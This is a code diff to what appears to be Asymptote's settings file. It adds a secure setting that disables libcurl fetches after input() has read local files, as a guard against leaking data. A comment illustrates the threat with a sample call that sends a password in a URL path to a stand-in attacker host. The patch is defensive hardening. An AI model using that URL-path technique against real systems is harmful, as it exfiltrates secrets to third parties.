@@ -346,9 +346,22 @@ bool safe=true;
 bool globalRead=true;
 // Enable writing to (or changing to) other directories
 bool globalWrite=false;
+// Flag set when input() reads any file
+bool haveReadFile=false;
+// Set true only if -curlAfterRead was explicitly given on the command line
+bool curlOverride=false;
 
 bool globalwrite() {return globalWrite || !safe;}
 bool globalread() {return globalRead || !safe;}
+
+#ifdef HAVE_LIBCURL
+// Blocking libcurl prevents DNS/log leakage: even a failed URL request
+// (e.g., input("https://evil.com/root-password-is-123")) exposes the URL
+// path and the user's IP address in the remote server's logs.
+bool curlEnabled() {return curlOverride || !haveReadFile;}
+#else
+bool curlEnabled() {return false;}
+#endif
 
 const string suffix="asy";
 const string guisuffix="gui";
@@ -1792,6 +1805,9 @@ void initSettings() {
   addSecureSetting(new boolrefSetting("globalread", 0,
                                       "Allow read from other directory",
                                       &globalRead, true));
+  addSecureSetting(new boolrefSetting("curlAfterRead", 0,
+                                      "Allow libcurl after reading local files via input()",
+                                      &curlOverride, false));
   addSecureSetting(new stringSetting("outname", 'o', "name",
                                      "Alternative output directory/file prefix"));
   addOption(new stringOption("cd", 0, "directory", "Set current directory",
